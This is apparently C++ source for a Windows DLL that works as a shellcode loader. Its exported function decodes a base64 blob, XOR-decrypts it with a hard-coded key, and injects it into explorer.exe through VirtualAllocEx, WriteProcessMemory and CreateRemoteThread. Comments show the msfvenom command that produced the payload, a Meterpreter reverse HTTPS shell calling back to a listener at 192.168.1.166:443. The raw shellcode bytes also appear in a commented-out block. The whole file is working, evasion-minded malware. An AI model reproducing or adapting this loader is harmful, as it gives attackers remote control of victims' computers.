// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "base64.h"
#include <Windows.h>
#include "Windows.h"
#include <wchar.h>
#include "iostream"
#include <tlhelp32.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


int Error(const char* text) {
    printf("%s (%u)\n", text, GetLastError());
    return 1;
}



DWORD GetProcessByName(const wchar_t* name)
{
    DWORD pid = 0;

    // Create toolhelp snapshot.
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);


    // Walkthrough all processes.
    if (Process32First(snapshot, &process))
    {
        do
        {
            if (!wcscmp(process.szExeFile, name)) {
                pid = process.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);

    if (pid != 0)
    {
        return pid;
    }

    // Not found


    return NULL;
}


extern "C" __declspec(dllexport) void VoidFunc()
{
    //MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);


    // LHOST=192.168.1.166
    // Lengh 667
    char shellcode[667] = "";
    const char* encoded = "rz3z14K7/2NyMzVwEiUiYjpi4TUXe/9zMz37YWobuDFSfkXoG3rHeTgbuBEie0Xh/0kRT3B/EyKz+nlgUrSS3iAbuDFSuDYdEiQ4MqI1shtqOHYu1gdwM3LYs+tyM3Rp1rUEVDpS4+g6KyRl2DVQenOD0DU6zL1g2EH4fkOae2Kke0Xh/zSx+n8SMqJK0wHQH3Y8F3oWCrIH6yxl2DVUenODVSL5Pzxl2DVsenODcuh2uzwggzQocioNajkzazV4Ei84sJ5zcjGN0yxgCi84uGC6eJyNzClpYq4jeswkWg0bXRFVUzQme/uyeqSwfwMHVIqlYCEbuoIhaTkQkzhB+iEAetlIZQ2GU3VwM42G221yM3QQakdeAkRrHVJcAkIXUy84urMa9KPJMnQhHkS5YCE5MDA7iSOozLNwM3JTzLaaQnQhU1pBRENjQSgqdh5JPxYoAkM3YzweeSRWOiw3HkVnWhcgRztlIy0GACAEV1IlfjlCKgEhSjwdBSw5XS57PzwAeRsqYg8QSx5COUIFCwM2XTkCUjZzA0RCAR4XazwqXRpIakUqZRkrAgwiAjxnEkdHQEpTe+qzYC5gCzhB+iEbi2NAm/AhU3VwYyEAeqSw2CEPaIqle/uVWWkte/3QOWoqYRrTAGNyev3BOXExajvpRiXstXQhU3WP5j9i8zAoe/3QHkS5fkOaYDA79LYMVW0LzKfW8xZte7Pg22ZwMzvpd5NH03QhU3WP5jqs/Bdw2N7JBnVwMyEKWSMoev3wkpdgerWTM3NyMz2bC9Ej1nJTM2ON5jyyACY4upUbupI6uq5olLVwE3JTeuqLes4zxfySM3JTM5yne/flc/CwR8A1uGQ6MrekkwCia7ELWWMriJQ8eX8xuqis5g==";


    printf("[+] Decoding b64 payload...\n");
    int result = Base64decode((char*)shellcode, encoded);

    printf("[+] Decrypting shellcode...\n");
    unsigned char key[] = "Sup3rS3cr3t!";
    for (int i = 0; i < sizeof(shellcode); i++) {
        shellcode[i] = shellcode[i] ^ key[i % (sizeof(key) - 1)];
    }



    /*
    root@kali: / var / www / html# msfvenom - p windows / x64 / meterpreter / reverse_https LHOST = 192.168.1.166 LPORT = 443 EXITFUNC = thread - f C - v shellcode
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch : x64 from the payload
    No encoder specified, outputting raw payload
    Payload size : 635 bytes
    Final size of c file : 2708 bytes
    */
    /*
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x51"
        "\x48\x8b\x52\x20\x56\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
        "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
        "\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
        "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
        "\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
        "\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
        "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
        "\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
        "\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
        "\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00"
        "\x00\x00\xff\xd5\xe8\x0e\x00\x00\x00\x31\x39\x32\x2e\x31"
        "\x36\x38\x2e\x31\x2e\x31\x36\x36\x00\x5a\x48\x89\xc1\x49"
        "\xc7\xc0\xbb\x01\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53"
        "\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\x51"
        "\x00\x00\x00\x2f\x59\x50\x4f\x42\x61\x54\x2d\x45\x48\x64"
        "\x76\x74\x47\x75\x77\x59\x6a\x72\x34\x4a\x50\x77\x70\x41"
        "\x2d\x4b\x41\x44\x66\x79\x70\x74\x64\x53\x62\x6f\x6f\x64"
        "\x77\x55\x6a\x6c\x69\x6e\x31\x51\x58\x41\x4c\x39\x7a\x4e"
        "\x63\x5f\x69\x34\x45\x57\x73\x74\x79\x68\x6f\x41\x33\x78"
        "\x74\x71\x77\x53\x71\x42\x68\x34\x73\x45\x4b\x74\x78\x00"
        "\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8\x00"
        "\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb"
        "\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1"
        "\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a\x04"
        "\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5"
        "\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31\xc9"
        "\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75"
        "\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35\xe0"
        "\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa\xe8"
        "\x55\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2"
        "\x10\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5"
        "\x00\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48"
        "\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89"
        "\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48"
        "\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3\x85"
        "\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a"
        "\x41\x89\xda\xff\xd5";
    */

    
    HANDLE processHandle;
    HANDLE remoteThread;
    PVOID remoteBuffer;

    const wchar_t* processname = L"explorer.exe";
    DWORD pid = GetProcessByName(processname);
    printf("Injecting to PID: %d", pid);
    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    if (!processHandle)
        Error("Failed to open process");

    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer)
        Error("Failed to allocate memory");

    if (!WriteProcessMemory(processHandle, remoteBuffer, &shellcode, sizeof shellcode, NULL))
        Error("Failed in WriteProcessMemory");

    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);
}

